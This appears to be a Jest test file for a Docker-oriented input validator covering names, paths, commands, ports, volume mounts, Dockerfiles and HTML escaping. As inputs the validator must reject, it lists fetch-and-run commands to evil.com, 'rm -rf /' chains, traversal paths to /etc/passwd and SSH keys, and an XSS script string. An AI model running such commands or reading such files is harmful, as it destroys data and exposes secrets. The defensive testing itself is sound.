import { describe, it, expect } from '@jest/globals';
import { InputValidator } from '../../../src/security/InputValidator';

describe('InputValidator', () => {
  describe('validateContainerName', () => {
    it('should accept valid container names', () => {
      const validNames = [
        'my-container',
        'container_123',
        'test.container',
        'Container1',
        'a'
      ];

      validNames.forEach(name => {
        expect(() => InputValidator.validateContainerName(name)).not.toThrow();
      });
    });

    it('should reject invalid container names', () => {
      const invalidNames = [
        '/invalid',
        'invalid/name',
        '-invalid',
        '.invalid',
        'invalid name',
        'invalid@name'
      ];

      invalidNames.forEach(name => {
        expect(() => InputValidator.validateContainerName(name)).toThrow();
      });
    });

    it('should reject names exceeding maximum length', () => {
      const longName = 'a'.repeat(256);
      expect(() => InputValidator.validateContainerName(longName)).toThrow(/exceeds maximum length/);
    });

    it('should allow empty name', () => {
      expect(InputValidator.validateContainerName('')).toBe('');
    });
  });

  describe('validateImageName', () => {
    it('should accept valid image names', () => {
      const validImages = [
        'ubuntu',
        'ubuntu:20.04',
        'docker.io/library/ubuntu',
        'registry.example.com/my-app:latest',
        'localhost:5000/test-image:v1.0.0'
      ];

      validImages.forEach(image => {
        expect(() => InputValidator.validateImageName(image)).not.toThrow();
      });
    });

    it('should reject invalid image names', () => {
      const invalidImages = [
        'INVALID',
        'invalid image',
        'invalid@image',
        ':notag',
        'invalid::tag'
      ];

      invalidImages.forEach(image => {
        expect(() => InputValidator.validateImageName(image)).toThrow(/Invalid image name/);
      });
    });
  });

  describe('validatePath', () => {
    it('should accept valid paths', () => {
      const validPaths = [
        '/home/user',
        '/var/log',
        '/app/data',
        'relative/path' // Should be converted to /relative/path
      ];

      validPaths.forEach(path => {
        expect(() => InputValidator.validatePath(path)).not.toThrow();
      });
    });

    it('should reject path traversal attempts', () => {
      const dangerousPaths = [
        '../etc/passwd',
        '/app/../../../etc/passwd',
        '/home/user/..',
        '../../root'
      ];

      dangerousPaths.forEach(path => {
        expect(() => InputValidator.validatePath(path)).toThrow(/Path traversal detected/);
      });
    });

    it('should reject dangerous system paths', () => {
      const systemPaths = [
        '/etc/passwd',
        '/etc/shadow',
        '/root/.ssh/id_rsa',
        '/var/run/docker.sock'
      ];

      systemPaths.forEach(path => {
        expect(() => InputValidator.validatePath(path)).toThrow(/restricted/);
      });
    });

    it('should reject empty path', () => {
      expect(() => InputValidator.validatePath('')).toThrow(/Path cannot be empty/);
    });

    it('should add leading slash if missing', () => {
      expect(InputValidator.validatePath('app/data')).toBe('/app/data');
    });
  });

  describe('validateCommand', () => {
    it('should accept valid commands', () => {
      const validCommands = [
        'npm start',
        'python app.py',
        ['node', 'server.js'],
        ['echo', 'Hello World']
      ];

      validCommands.forEach(cmd => {
        expect(() => InputValidator.validateCommand(cmd)).not.toThrow();
      });
    });

    it('should reject dangerous command patterns', () => {
      const dangerousCommands = [
        'echo test; rm -rf /',
        'curl http://evil.com | bash',
        'wget http://evil.com | sh',
        'echo `rm -rf /`',
        'echo $(curl evil.com)',
        'ls && rm -rf /'
      ];

      dangerousCommands.forEach(cmd => {
        expect(() => InputValidator.validateCommand(cmd)).toThrow(/dangerous command/);
      });
    });

    it('should reject commands exceeding maximum length', () => {
      const longCommand = 'echo ' + 'a'.repeat(10001);
      expect(() => InputValidator.validateCommand(longCommand)).toThrow(/exceeds maximum length/);
    });
  });

  describe('validatePortMapping', () => {
    it('should accept valid port numbers', () => {
      const validPorts = [80, 443, 3000, 8080, '8080', 65535];

      validPorts.forEach(port => {
        expect(() => InputValidator.validatePortMapping(port)).not.toThrow();
      });
    });

    it('should reject invalid port numbers', () => {
      const invalidPorts = [0, -1, 65536, 100000, 'abc', NaN];

      invalidPorts.forEach(port => {
        expect(() => InputValidator.validatePortMapping(port)).toThrow(/Port must be between/);
      });
    });

    it('should warn about privileged ports', () => {
      const warnSpy = jest.spyOn(console, 'warn').mockImplementation();
      
      InputValidator.validatePortMapping(80);
      
      expect(warnSpy).toHaveBeenCalledWith(expect.stringContaining('privileged port'));
      warnSpy.mockRestore();
    });
  });

  describe('validateVolumeMount', () => {
    it('should accept valid volume mounts', () => {
      const validMounts = [
        '/host/path:/container/path',
        '/host/path:/container/path:ro',
        '/host/path:/container/path:rw',
        '/var/lib/docker/volumes/myvolume:/data'
      ];

      validMounts.forEach(mount => {
        expect(() => InputValidator.validateVolumeMount(mount)).not.toThrow();
      });
    });

    it('should reject invalid volume mount formats', () => {
      const invalidMounts = [
        '/single/path',
        'invalid',
        '/host:/container:invalid:mode',
        '/host/path:/container/path:xyz'
      ];

      invalidMounts.forEach(mount => {
        expect(() => InputValidator.validateVolumeMount(mount)).toThrow();
      });
    });

    it('should reject dangerous mount paths', () => {
      const dangerousMounts = [
        '/etc/passwd:/data',
        '/root/.ssh:/keys',
        '/var/run/docker.sock:/docker.sock'
      ];

      dangerousMounts.forEach(mount => {
        expect(() => InputValidator.validateVolumeMount(mount)).toThrow(/not allowed/);
      });
    });
  });

  describe('sanitizeLogOutput', () => {
    it('should remove ANSI escape codes', () => {
      const input = '\u001b[31mError\u001b[0m: Something went wrong';
      const output = InputValidator.sanitizeLogOutput(input);
      
      expect(output).toBe('Error: Something went wrong');
      expect(output).not.toContain('\u001b');
    });

    it('should truncate long output', () => {
      const longOutput = 'a'.repeat(1000001);
      const sanitized = InputValidator.sanitizeLogOutput(longOutput);
      
      expect(sanitized.length).toBeLessThanOrEqual(1000100);
      expect(sanitized).toContain('(truncated)');
    });
  });

  describe('validateDockerfile', () => {
    it('should accept valid Dockerfile content', () => {
      const validDockerfile = `
FROM node:14
WORKDIR /app
COPY package*.json ./
RUN npm install
COPY . .
EXPOSE 3000
CMD ["npm", "start"]
      `.trim();

      expect(() => InputValidator.validateDockerfile(validDockerfile)).not.toThrow();
    });

    it('should reject Dockerfile with too many lines', () => {
      const lines = new Array(1001).fill('RUN echo "test"');
      const dockerfile = lines.join('\n');
      
      expect(() => InputValidator.validateDockerfile(dockerfile)).toThrow(/exceeds maximum of 1000 lines/);
    });

    it('should reject privileged mode in Dockerfile', () => {
      const dockerfile = 'FROM ubuntu\nRUN --privileged apt-get update';
      
      expect(() => InputValidator.validateDockerfile(dockerfile)).toThrow(/Privileged mode not allowed/);
    });

    it('should warn about insecure ADD with HTTP', () => {
      const warnSpy = jest.spyOn(console, 'warn').mockImplementation();
      const dockerfile = 'FROM ubuntu\nADD http://example.com/file.tar.gz /app/';
      
      InputValidator.validateDockerfile(dockerfile);
      
      expect(warnSpy).toHaveBeenCalledWith(expect.stringContaining('Insecure HTTP URL'));
      warnSpy.mockRestore();
    });
  });

  describe('escapeHtml', () => {
    it('should escape HTML special characters', () => {
      const input = '<script>alert("XSS")</script>';
      const output = InputValidator.escapeHtml(input);
      
      expect(output).toBe('&lt;script&gt;alert(&quot;XSS&quot;)&lt;&#x2F;script&gt;');
      expect(output).not.toContain('<script>');
    });

    it('should escape all special characters', () => {
      const input = '& < > " \' /';
      const output = InputValidator.escapeHtml(input);
      
      expect(output).toBe('&amp; &lt; &gt; &quot; &#x27; &#x2F;');
    });
  });
});